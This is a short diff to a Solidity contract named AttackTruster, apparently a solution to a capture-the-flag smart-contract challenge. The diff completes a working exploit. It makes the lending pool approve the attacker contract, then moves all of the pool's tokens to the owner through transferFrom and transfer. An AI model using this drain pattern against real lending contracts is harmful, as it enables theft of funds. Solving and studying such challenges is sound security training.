@@ -20,12 +20,13 @@ contract AttackTruster {
             address(token),
             abi.encodeWithSignature(
                 "approve(address,uint256)",
-                owner,
+                address(this),
                 amount
             )
         );
 
-        // transfer approved tokens ??
-        // token.transferFrom(address(pool), owner, 1);
+        // transfer approved tokens
+        token.transferFrom(address(pool), address(this), amount);
+        token.transfer(owner, amount);
     }
 }
